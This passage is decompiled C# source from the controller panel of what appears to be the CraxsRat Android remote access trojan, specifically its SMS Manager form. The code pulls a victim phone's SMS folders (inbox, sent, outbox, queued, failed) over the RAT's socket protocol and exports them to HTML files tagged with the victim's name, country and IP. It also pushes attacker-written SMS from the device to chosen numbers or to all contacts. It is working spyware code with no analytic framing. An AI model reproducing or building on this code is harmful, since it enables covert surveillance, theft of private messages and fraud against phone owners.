		if ((e.RowIndex != -1) & (e.ColumnIndex != -1))
		{
			SelectMessage(e.RowIndex);
		}
	}

	private void SelectMessage(int index)
	{
		if (index != -1)
		{
			showtext.Text = Conversions.ToString(DGV0.Rows[index].Tag);
		}
	}

	private void SMSManager_Closing(object sender, CancelEventArgs e)
	{
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb(string v)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".sms" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getSMS + Data.SPL_SOCKET + "sms" + Data.SPL_DATA + v,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

	private void AllToolStripMenuItem_Click(object sender, EventArgs e)
	{
		CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/");
	}

	private void OutboxToolStripMenuItem_Click(object sender, EventArgs e)
	{
		CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/outbox");
	}

	private void InboxToolStripMenuItem_Click(object sender, EventArgs e)
	{
		CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/inbox");
	}

	private void SentToolStripMenuItem_Click(object sender, EventArgs e)
	{
		CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/sent");
	}

	private void QueuedToolStripMenuItem_Click(object sender, EventArgs e)
	{
		CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/queued");
	}

	private void FailedToolStripMenuItem_Click(object sender, EventArgs e)
	{
		CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/failed");
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsjufrswas(object sender, EventArgs e)
	{
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
		saveFileDialog.Filter = "html (*.html)|*.html";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
			{
				reso.SAVEit((Array)a0);
			}, new object[8]
			{
				DGV0,
				"null",
				saveFileDialog.FileName,
				tmpClientName,
				tmpCountry + " - " + tmpAddressIP,
				"SMS",
				"sms",
				"null"
			});
		}
		saveFileDialog.Dispose();
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcytrqa(object sender, EventArgs e)
	{
		reso.Directory_Exist(classClient);
		ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
		{
			reso.SAVEit((Array)a0);
		}, new object[8]
		{
			DGV0,
			tmpFolderUSER,
			"SMS Manager",
			tmpClientName,
			tmpCountry + " - " + tmpAddressIP,
			"SMS",
			"sms",
			DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
		});
	}

	private void BoxTitle_Paint(object sender, PaintEventArgs e)
	{
		checked
		{
			if (BoxTitlePaintEventArgsWait)
			{
				int count = DGV0.Rows.Count;
				string text = "All " + Conversions.ToString(count);
				string text2 = "Selected " + Conversions.ToString(DGV0.SelectedRows.Count);
				Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
				e.Graphics.DrawLine(new Pen(Color.FromArgb(50, defaultColor_Foreground.R, defaultColor_Foreground.G, defaultColor_Foreground.B)), 0, 1, BoxTitle.Width, 1);
				Brush brush = new SolidBrush(SpySettings.DefaultColor_Foreground);
				Brush brush2 = new SolidBrush(Color.FromArgb(170, BoxTitle.BackColor.R, BoxTitle.BackColor.G, BoxTitle.BackColor.B));
				Size size = TextRenderer.MeasureText(text + Strings.Space(10) + text2, reso.f);
				Rectangle rect = new Rectangle(0, 2, BoxTitle.Width, size.Height + 5);
				e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
				e.Graphics.DrawString(text + Strings.Space(10) + text2 + Strings.Space(10), reso.f, brush, 0f, 2f);
				Size size2 = TextRenderer.MeasureText("S", reso.f);
				if (BoxTitle.Height != size2.Height + 3)
				{
					BoxTitle.Height = size2.Height + 3;
				}
			}
		}
	}

	private void AngelAndroidForm_Activated(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void BoxTitle_Resize(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwsakartx(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				if (classClient == null)
				{
					return;
				}
				smsMaker smsMaker2 = new smsMaker();
				if (smsMaker2.ShowDialog() != DialogResult.OK || smsMaker2.numslist.Items.Count <= 0)
				{
					return;
				}
				string text = smsMaker2.msgtext.Text;
				TcpClient myClient = classClient.myClient;
				string[] array = classClient.Keys.Split(':');
				int num = 0;
				int num2 = 0;
				if (smsMaker2.checkall.Checked)
				{
					object[] parametersObjects = new object[4]
					{
						myClient,
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "ssms<*>all<>" + text + "#" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
				}
				else
				{
					int num3 = smsMaker2.numslist.Items.Count - 1;
					for (int i = 0; i <= num3; i++)
					{
						string text2 = Conversions.ToString(smsMaker2.numslist.Items[i]);
						if (!(string.IsNullOrEmpty(text2) | string.IsNullOrWhiteSpace(text2)))
						{
							object[] parametersObjects2 = new object[4]
							{
								myClient,
								SecurityKey.KeysClient2 + Data.SPL_SOCKET + "ssms<*>" + text2 + "#" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
								Codes.Encoding().GetBytes("null"),
								classClient
							};
							classClient.SendMessage(parametersObjects2);
						}
					}
				}
				CraxsAlert.ShowSucess("your message was sent successfully");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void DGV0_SelectionChanged(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}
}
